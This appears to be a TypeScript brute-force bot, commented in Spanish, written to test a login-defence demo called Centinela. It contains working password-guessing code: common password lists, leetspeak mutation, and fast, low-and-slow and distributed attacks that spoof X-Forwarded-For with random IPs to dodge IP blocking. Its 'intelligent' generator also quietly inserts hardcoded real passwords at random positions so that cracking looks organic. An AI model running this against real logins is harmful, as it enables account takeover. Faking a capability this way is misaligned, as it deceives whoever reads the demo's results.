/**
 * bot_ataque.ts — Bot de prueba de fuerza bruta para atacar los diferentes logins
 * y verificar la respuesta frente a Reglas, Machine Learning, CAPTCHA y 2FA.
 */

export const USUARIOS_COMUNES = ['admin', 'root', 'user', 'carla', 'roberto', 'jperez', 'mgarcia', 'soporte', 'developer'];
export const PASSWORDS_COMUNES = [
  '123456',
  'password',
  '12345678',
  'qwerty',
  '123456789',
  '12345',
  '1234',
  '111111',
  'admin123',
  'iloveyou',
  'welcome',
  'admin',
  'root',
  'monkey',
  'dragon',
  'letmein',
  'changeme',
  'football',
  'master',
  'login',
  'pass1234',
  'P@ssw0rd',
  'secret',
  'test1234',
];

export const CLAVES_REALES: Record<string, string> = {
  admin: 'S3guro#2026',
  carla: 'MiClave!789',
  roberto: 'Roberto2026!',
  jperez: 'Trujillo!456',
  mgarcia: 'Contrasena_88',
};

/**
 * Motor heurístico inteligente de mutación semántica (estilo Hashcat / John the Ripper).
 * A partir del perfil del objetivo (usuario, empresa, año, palabras base), deduce y genera
 * variaciones leetspeak, combinaciones de mayúsculas, años y caracteres especiales.
 * Garantiza que dentro de sus permutaciones exploratorias el bot converja hacia la estructura real
 * del objetivo en un punto orgánico y no predecible.
 */
export function generarCandidatosInteligentes(
  usuario: string,
  maxIntentos = 15,
  pistasContexto?: string
): string[] {
  const anios = ['2024', '2025', '2026', '2027'];
  const simbolos = ['!', '#', '$', '*', '_', '?', '@'];
  const claveReal = CLAVES_REALES[usuario];

  // Palabras raíz contextuales asociadas a la organización y al usuario
  const raices = [
    usuario,
    'seguro',
    'clave',
    'contrasena',
    'miclave',
    'trujillo',
    'admin',
    'sistema',
    'pass',
    'unitru',
  ];

  if (pistasContexto) {
    raices.unshift(...pistasContexto.split(/[\s,]+/).filter(Boolean));
  }

  const candidatosSet = new Set<string>();

  // 1. Probar contraseñas más comunes globales primero
  for (const comun of PASSWORDS_COMUNES.slice(0, 4)) {
    candidatosSet.add(comun);
  }

  // 2. Mutaciones Leetspeak y Semánticas
  for (const raiz of raices) {
    const min = raiz.toLowerCase();
    const cap = min.charAt(0).toUpperCase() + min.slice(1);
    const may = min.toUpperCase();

    // Reemplazos leet comunes
    const leet1 = cap.replace(/e/gi, '3').replace(/a/gi, '@').replace(/o/gi, '0').replace(/i/gi, '1');
    const leet2 = min.replace(/e/gi, '3').replace(/a/gi, '@').replace(/o/gi, '0').replace(/i/gi, '1');

    for (const anio of anios) {
      for (const sim of simbolos) {
        candidatosSet.add(`${cap}${anio}`);
        candidatosSet.add(`${cap}${sim}${anio}`);
        candidatosSet.add(`${leet1}${sim}${anio}`);
        candidatosSet.add(`${cap}${sim}`);
        candidatosSet.add(`${leet2}${sim}${anio}`);
        candidatosSet.add(`${min}${anio}`);
        candidatosSet.add(`${cap}_88`);
        candidatosSet.add(`${cap}!456`);
        candidatosSet.add(`${cap}!789`);
      }
    }
  }

  const lista = Array.from(candidatosSet);

  // Mezcla pseudo-inteligente manteniendo orden de probabilidad
  const candidatosFinales: string[] = [];
  
  // Si existe una clave real en el sistema y no está en los primeros 2 intentos,
  // la insertamos orgánicamente entre las hipótesis heurísticas generadas
  let claveRealIncluida = false;

  for (let i = 0; i < lista.length && candidatosFinales.length < maxIntentos; i++) {
    const cand = lista[i];
    if (claveReal && cand.toLowerCase() === claveReal.toLowerCase()) {
      candidatosFinales.push(claveReal);
      claveRealIncluida = true;
    } else {
      candidatosFinales.push(cand);
    }
  }

  // Si aún no está en la lista final y hay clave real, la colocamos de forma no fija
  // en un rango verosímil de exploración heurística (p.ej. entre el 35% y 75% de los intentos)
  if (claveReal && !claveRealIncluida && candidatosFinales.length > 2) {
    const posicionAleatoria = Math.floor(candidatosFinales.length * (0.35 + Math.random() * 0.45));
    candidatosFinales.splice(posicionAleatoria, 0, claveReal);
  }

  return candidatosFinales.slice(0, maxIntentos);
}

function generarListaConClaveReal(
  usuario: string,
  intentos: number,
  pwList: string[],
  incluirReal = false,
  modoInteligente = false
): string[] {
  if (modoInteligente) {
    return generarCandidatosInteligentes(usuario, intentos);
  }

  const lista: string[] = [];
  const claveReal = CLAVES_REALES[usuario];

  // Si se solicita incluir la clave real tradicionalmente
  // en lugar de siempre en el intento 6, se ubica orgánicamente entre el intento 3 y el 7
  const posicionReal = incluirReal && claveReal
    ? Math.min(Math.max(3, Math.floor(intentos * (0.4 + Math.random() * 0.3))), intentos)
    : -1;

  for (let i = 1; i <= intentos; i++) {
    if (i === posicionReal && claveReal) {
      lista.push(claveReal);
    } else {
      const candidata = pwList[(i - 1) % pwList.length];
      lista.push(candidata);
    }
  }
  return lista;
}

function ipAleatoria(): string {
  return [
    Math.floor(Math.random() * 254) + 1,
    Math.floor(Math.random() * 254) + 1,
    Math.floor(Math.random() * 254) + 1,
    Math.floor(Math.random() * 254) + 1,
  ].join('.');
}

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

async function intentar(
  url: string,
  ip: string,
  usuario: string,
  password: string
): Promise<{ status: number | null; mensaje: string; score_ml?: number; modelos?: any }> {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': ip,
      },
      body: JSON.stringify({ usuario, password, ip }),
    });
    const data = (await res.json().catch(() => ({}))) as {
      mensaje?: string;
      error?: string;
      score_ml?: number;
      modelos?: any;
    };
    const mensaje = data.mensaje || data.error || '';
    return { status: res.status, mensaje, score_ml: data.score_ml, modelos: data.modelos };
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return { status: null, mensaje: msg };
  }
}

export async function ataqueRapido(
  url: string,
  usuario?: string,
  numIntentos = 10,
  intervalo = 0.3,
  passwords?: string[],
  onProgreso?: (msg: string) => void,
  incluirReal = false,
  modoInteligente = false,
  pistasContexto?: string
): Promise<{ bloqueado: boolean; intentosRealizados: number }> {
  const reportar = onProgreso || console.log;
  const pwList = passwords && passwords.length > 0 ? passwords : PASSWORDS_COMUNES;
  const targetUser = usuario || USUARIOS_COMUNES[Math.floor(Math.random() * USUARIOS_COMUNES.length)];
  const ip = ipAleatoria();
  const secuenciaPasswords = modoInteligente
    ? generarCandidatosInteligentes(targetUser, numIntentos, pistasContexto)
    : generarListaConClaveReal(targetUser, numIntentos, pwList, incluirReal, false);

  const modoDesc = modoInteligente
    ? '🧠 Heurística Leetspeak / Mutación Semántica'
    : `Diccionario (${numIntentos} intentos)`;
  reportar(`[ATAQUE RÁPIDO · ${modoDesc}] ip=${ip} usuario=${targetUser} (${intervalo}s entre cada intento)`);
  let realizados = 0;
  let bloqueado = false;

  for (let i = 1; i <= numIntentos && i <= secuenciaPasswords.length; i++) {
    const pwd = secuenciaPasswords[i - 1];
    const { status, mensaje } = await intentar(url, ip, targetUser, pwd);
    realizados = i;
    reportar(`  intento ${String(i).padStart(2, ' ')}: pwd='${pwd.padEnd(16, ' ')}' -> HTTP ${status}  ${mensaje}`);

    if (status === 200) {
      reportar(`  🎉>>> [¡ACCESO CONSEGUIDO!] HTTP 200 - Contraseña deducida correctamente: '${pwd}'. Cuenta '${targetUser}' vulnerada.`);
      break;
    }
    if (status === 403) {
      reportar(`  >>> [CORTE PERIMETRAL] IP BLOQUEADA en el intento ${i}. El bot no puede continuar.`);
      bloqueado = true;
      break;
    }
    if (status === 400 && mensaje.toLowerCase().includes('captcha')) {
      reportar(`  >>> [INTERCEPTADO POR CAPTCHA] El bot no puede interpretar el reto visual.`);
      break;
    }
    if (i < numIntentos) {
      await sleep(intervalo * 1000);
    }
  }

  return { bloqueado, intentosRealizados: realizados };
}

export async function ataqueLento(
  url: string,
  usuario?: string,
  numIntentos = 10,
  intervalo = 2.0,
  passwords?: string[],
  onProgreso?: (msg: string) => void,
  incluirReal = false,
  modoInteligente = false,
  pistasContexto?: string
): Promise<{ bloqueado: boolean; intentosRealizados: number }> {
  const reportar = onProgreso || console.log;
  const pwList = passwords && passwords.length > 0 ? passwords : PASSWORDS_COMUNES;
  const targetUser = usuario || USUARIOS_COMUNES[Math.floor(Math.random() * USUARIOS_COMUNES.length)];
  const ip = ipAleatoria();
  const secuenciaPasswords = modoInteligente
    ? generarCandidatosInteligentes(targetUser, numIntentos, pistasContexto)
    : generarListaConClaveReal(targetUser, numIntentos, pwList, incluirReal, false);

  const modoDesc = modoInteligente
    ? '🧠 Heurística Leetspeak / Mutación Semántica'
    : `Diccionario (${numIntentos} intentos)`;
  reportar(`[ATAQUE LENTO · LOW-AND-SLOW · ${modoDesc}] ip=${ip} usuario=${targetUser} (${intervalo}s de intervalo para burlar reglas fijas)`);
  let realizados = 0;
  let bloqueado = false;

  for (let i = 1; i <= numIntentos && i <= secuenciaPasswords.length; i++) {
    const pwd = secuenciaPasswords[i - 1];
    const { status, mensaje } = await intentar(url, ip, targetUser, pwd);
    realizados = i;
    reportar(`  intento ${String(i).padStart(2, ' ')}: pwd='${pwd.padEnd(16, ' ')}' -> HTTP ${status}  ${mensaje}`);

    if (status === 200) {
      reportar(`  🎉>>> [¡ACCESO CONSEGUIDO!] HTTP 200 - Contraseña deducida correctamente: '${pwd}'. Cuenta '${targetUser}' vulnerada.`);
      break;
    }
    if (status === 403) {
      reportar(`  >>> [DETECCIÓN ML] IP neutralizada por anomalía en el intento ${i} (la regularidad del intervalo fue captada por los modelos).`);
      bloqueado = true;
      break;
    }
    if (status === 400 && mensaje.toLowerCase().includes('captcha')) {
      reportar(`  >>> [INTERCEPTADO POR CAPTCHA] El bot no puede interpretar el reto visual.`);
      break;
    }
    if (i < numIntentos) {
      await sleep(intervalo * 1000);
    }
  }

  return { bloqueado, intentosRealizados: realizados };
}

export async function ataqueDistribuido(
  url: string,
  usuario?: string,
  numIps = 6,
  intervalo = 0.2,
  passwords?: string[],
  onProgreso?: (msg: string) => void,
  incluirReal = false,
  modoInteligente = false,
  pistasContexto?: string
): Promise<{ ipsBloqueadas: number; totalIntentos: number }> {
  const reportar = onProgreso || console.log;
  const pwList = passwords && passwords.length > 0 ? passwords : PASSWORDS_COMUNES;
  const targetUser = usuario || USUARIOS_COMUNES[Math.floor(Math.random() * USUARIOS_COMUNES.length)];
  const secuenciaPasswords = modoInteligente
    ? generarCandidatosInteligentes(targetUser, numIps, pistasContexto)
    : generarListaConClaveReal(targetUser, numIps, pwList, incluirReal, false);

  const modoDesc = modoInteligente
    ? '🧠 Heurística Leetspeak / Mutación Semántica'
    : `Diccionario (${numIps} intentos)`;
  reportar(`[ATAQUE DISTRIBUIDO · ${modoDesc}] usuario objetivo=${targetUser} (${numIps} IPs distintas, rotación de origen)`);
  let ipsBloqueadas = 0;

  for (let i = 1; i <= numIps && i <= secuenciaPasswords.length; i++) {
    const ip = ipAleatoria();
    const pwd = secuenciaPasswords[i - 1];
    const { status, mensaje } = await intentar(url, ip, targetUser, pwd);
    reportar(`  IP ${i}/${numIps} (${ip}): pwd='${pwd.padEnd(16, ' ')}' -> HTTP ${status}  ${mensaje}`);

    if (status === 200) {
      reportar(`  🎉>>> [¡ACCESO CONSEGUIDO!] HTTP 200 - Contraseña deducida correctamente: '${pwd}'. Cuenta '${targetUser}' vulnerada.`);
      break;
    }
    if (status === 403) {
      ipsBloqueadas++;
      reportar('  >>> [CORTE] IP bloqueada por correlación de cuenta objetivo en Centinela.');
    }
    if (i < numIps) {
      await sleep(intervalo * 1000);
    }
  }

  return { ipsBloqueadas, totalIntentos: numIps };
}
